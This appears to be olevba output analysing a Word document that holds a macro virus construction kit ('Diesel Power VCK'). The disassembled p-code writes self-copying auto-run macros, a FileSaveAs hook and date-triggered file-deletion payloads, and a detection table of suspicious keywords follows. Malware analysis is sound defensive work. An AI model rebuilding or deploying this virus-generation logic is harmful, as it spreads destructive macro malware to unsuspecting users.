' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 ", 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #192:
' 	EndIfBlock 
' Line #193:
' 	Ld CheckBox4 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #194:
' 	LineCont 0x0008 0F 00 08 00 18 00 08 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 ", 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #195:
' 	EndIfBlock 
' Line #196:
' 	LitStr 0x0006 "End If"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #197:
' 	Ld T$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #198:
' 	LitStr 0x0006 "QuitC:"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #199:
' 	LitStr 0x0007 "End Sub"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #200:
' 	LitStr 0x001C "'=== end of macros AutoClose"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #201:
' 	EndIfBlock 
' Line #202:
' Line #203:
' 	Ld CheckBox3 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #204:
' 	LitStr 0x001D "'=== begin of macros AutoExec"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #205:
' 	LitStr 0x0008 "Sub MAIN"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #206:
' 	LitStr 0x000D "Call AutoOpen"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #207:
' 	LitStr 0x000C "Call AutoNew"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #208:
' 	LitStr 0x0007 "End Sub"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #209:
' 	LitStr 0x001B "'=== end of macros AutoExec"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #210:
' 	EndIfBlock 
' Line #211:
' Line #212:
' 	Ld CheckBox4 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #213:
' 	LitStr 0x001F "'=== begin of macros FileSaveAs"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #214:
' 	LitStr 0x0008 "Sub MAIN"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #215:
' 	LitStr 0x0015 "Dim dlg As FileSaveAs"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #216:
' 	LitStr 0x0010 "GetCurValues dlg"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #217:
' 	LitStr 0x000A "Dialog dlg"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #218:
' 	LitStr 0x000E "FileSaveAs dlg"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #219:
' 	LitStr 0x0007 "End Sub"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #220:
' 	LitStr 0x001D "'=== end of macros FileSaveAs"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #221:
' 	EndIfBlock 
' Line #222:
' Line #223:
' 	LitStr 0x0015 "'=== begin of macros "
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #224:
' 	Ld T$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #225:
' 	LineCont 0x0004 15 00 00 00
' 	LitStr 0x0001 "'"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld dlg 
' 	MemLd New$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A " virus by "
' 	Add 
' 	Ld dlg 
' 	MemLd Author$ 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #226:
' 	LitStr 0x0034 "'Created with Diesel Power VCK (c)by XaRaBaS [DkpRJ]"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #227:
' 	Ld T$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #228:
' 	Ld dlg 
' 	MemLd selector 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #229:
' 	GoTo Propusk 
' Line #230:
' 	EndIfBlock 
' Line #231:
' 	Ld dlg 
' 	MemLd TwoBox1 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #232:
' 	LitStr 0x0011 "if Year(Now()) = "
' 	Ld dlg 
' 	MemLd Year$ 
' 	Add 
' 	LitStr 0x0005 " Then"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #233:
' 	EndIfBlock 
' Line #234:
' 	Ld dlg 
' 	MemLd TwoBox2 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #235:
' 	LitStr 0x0012 "if Month(Now()) = "
' 	Ld dlg 
' 	MemLd Month$ 
' 	Add 
' 	LitStr 0x0005 " Then"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #236:
' 	EndIfBlock 
' Line #237:
' 	Ld dlg 
' 	MemLd TwoBox3 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #238:
' 	LitStr 0x0014 "if Weekday(Now()) = "
' 	Ld dlg 
' 	MemLd WeekDay$ 
' 	Add 
' 	LitStr 0x0005 " Then"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #239:
' 	EndIfBlock 
' Line #240:
' 	Ld dlg 
' 	MemLd TwoBox4 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #241:
' 	LitStr 0x0010 "if Day(Now()) = "
' 	Ld dlg 
' 	MemLd Day$ 
' 	Add 
' 	LitStr 0x0005 " Then"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #242:
' 	EndIfBlock 
' Line #243:
' 	Ld dlg 
' 	MemLd TwoBox5 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #244:
' 	LitStr 0x0011 "if Hour(Now()) = "
' 	Ld dlg 
' 	MemLd Hour$ 
' 	Add 
' 	LitStr 0x0005 " Then"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #245:
' 	EndIfBlock 
' Line #246:
' 	Ld dlg 
' 	MemLd TwoBox6 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #247:
' 	LitStr 0x0013 "if Second(Now()) = "
' 	Ld dlg 
' 	MemLd Second$ 
' 	Add 
' 	LitStr 0x0005 " Then"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #248:
' 	EndIfBlock 
' Line #249:
' 	Ld dlg 
' 	MemLd selector 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #250:
' 	LineCont 0x0004 13 00 03 00
' 	LitStr 0x0007 "MsgBox "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld dlg 
' 	MemLd Message$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ", "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #251:
' 	EndIfBlock 
' Line #252:
' 	Ld dlg 
' 	MemLd selector 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #253:
' 	LitStr 0x0005 "Kill "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld dlg 
' 	MemLd Kill$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #254:
' 	EndIfBlock 
' Line #255:
' 	Ld dlg 
' 	MemLd selector 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #256:
' 	LitStr 0x0008 "Payload1"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #257:
' 	EndIfBlock 
' Line #258:
' 	Ld dlg 
' 	MemLd selector 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #259:
' 	LitStr 0x0008 "Payload2"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #260:
' 	EndIfBlock 
' Line #261:
' 	Ld dlg 
' 	MemLd selector 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #262:
' 	LitStr 0x0008 "Payload3"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #263:
' 	EndIfBlock 
' Line #264:
' 	Ld dlg 
' 	MemLd TwoBox1 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "End If"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	EndIf 
' Line #265:
' 	Ld dlg 
' 	MemLd TwoBox2 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "End If"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	EndIf 
' Line #266:
' 	Ld dlg 
' 	MemLd TwoBox3 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "End If"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	EndIf 
' Line #267:
' 	Ld dlg 
' 	MemLd TwoBox4 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "End If"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	EndIf 
' Line #268:
' 	Ld dlg 
' 	MemLd TwoBox5 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "End If"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	EndIf 
' Line #269:
' 	Ld dlg 
' 	MemLd TwoBox6 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "End If"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	EndIf 
' Line #270:
' 	Label Propusk 
' Line #271:
' 	LitStr 0x0013 "'=== end of macros "
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #272:
' 	Ld dlg 
' 	MemLd File$ 
' 	ParamNamed New 
' 	LitDI2 0x0004 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #273:
' 	LitDI2 0x0002 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #274:
' 	LineCont 0x0004 0A 00 00 00
' 	LitStr 0x0013 "New virus created !"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "Thanks for using Diesel Power"
' 	Add 
' 	LitStr 0x000A "DPVCK v1.0"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #275:
' Line #276:
' 	Label Clo 
' Line #277:
' 	EndSub 
' Line #278:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |myscript.scr        |Executable file name                         |
|IOC       |myscript.exe        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

